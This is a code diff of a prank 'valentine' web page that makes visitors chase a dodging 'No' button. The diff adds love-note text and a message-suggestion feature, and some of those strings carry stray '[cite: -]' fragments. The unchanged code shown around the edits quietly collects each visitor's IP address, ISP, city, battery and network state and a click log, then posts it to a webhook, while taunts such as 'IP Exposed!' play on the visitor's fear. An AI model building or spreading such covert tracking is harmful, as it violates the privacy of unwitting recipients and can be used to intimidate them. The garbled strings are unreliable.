@@ -17,13 +17,12 @@
       background-size: cover; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 1000; padding: 20px; transition: opacity 0.8s ease;
     }
 
+    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; }
+    .pulsing { animation: heartBeat 3s infinite ease-in-out; }
     @keyframes heartBeat {
       0%, 100% { transform: scale(1); text-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
       50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); color: var(--gold); }
     }
-
-    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; }
-    .pulsing { animation: heartBeat 3s infinite ease-in-out; }
 
     @keyframes shake {
       0% { transform: scale(var(--scale)) translate(0,0); }
@@ -88,11 +87,17 @@
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1, lastMsgId = null, actionHistory = [];
   let batteryLevel = "Unknown", connectionType = "Unknown";
-  const WEBHOOK_URL = "YOUR_WEBHOOK_HERE"; // INSERT WEBHOOK
+  const WEBHOOK_URL = "YOUR_WEBHOOK_URL";
 
   const phase1 = ["Try again!", "Close!", "Nope!"];
   const phase2 = ["Seriously?", "Stop it.", "Wasting time."];
   const phase3 = ["Leak starting... 🔍", "Calling Mom... 📞", "IP Exposed! 📍"];
+
+  const promises = [
+    "I promise to hold your hand through every storm, {name}.",
+    "{name}, I promise to stay until the stars stop shining.",
+    "You made me the luckiest alive, {name}. I'm yours forever."
+  ];
 
   window.onload = async () => {
     if (navigator.getBattery) {
@@ -104,6 +109,7 @@
     }
 
     const params = new URLSearchParams(window.location.search);
+    if(params.get('to')) document.getElementById('userName').value = decodeURIComponent(params.get('to'));
     if(params.get('msg')) {
       const msgEl = document.getElementById('customText');
       msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
@@ -139,8 +145,7 @@
           { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
-          // INCREASED HISTORY LIMIT TO -20 ACTIONS
-          { name: "Full Activity Log (Last 20)", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
+          { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
           { name: "Network Data", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
         ],
         timestamp: new Date().toISOString()
@@ -175,10 +180,10 @@
     if (clickCount >= 10) document.body.style.background = "#800000";
 
     let msgList = clickCount < 6 ? phase1 : (clickCount < 16 ? phase2 : phase3);
-    const currentTaunt = msgList[Math.floor(Math.random() * msgList.length)];
+    const currentMsg = msgList[Math.floor(Math.random() * msgList.length)];
     
-    noBtn.innerText = currentTaunt;
-    document.getElementById("joke-text").innerText = currentTaunt;
+    noBtn.innerText = currentMsg;
+    document.getElementById("joke-text").innerText = currentMsg;
 
     noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
@@ -193,10 +198,23 @@
   }
 
   function yesClick() {
-    trackEvent("ACCEPTED! ❤️ Final Surrender.");
+    trackEvent("ACCEPTED! ❤️");
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
-    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>EXCELLENT CHOICE. ❤️</h2><p>Surrender processed. You are mine forever.</p></div>`;
+    const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
+    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>EXCELLENT CHOICE. ❤️</h2><p>${randomMsg}</p></div>`;
+  }
+
+  function updateSuggestions() {
+    const to = document.getElementById('targetInput').value.trim() || "You";
+    const deepMessages = [
+      `${to}, you are the piece of my soul I never knew was missing. [cite: -]`,
+      `Every beat of my heart belongs to you, ${to}. [cite: -]`,
+      `In a world of temporary things, ${to}, you are my forever. [cite: -]`
+    ];
+    const select = document.getElementById('suggestionBox');
+    select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + 
+      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
   }
 
   function processLinkGeneration() {
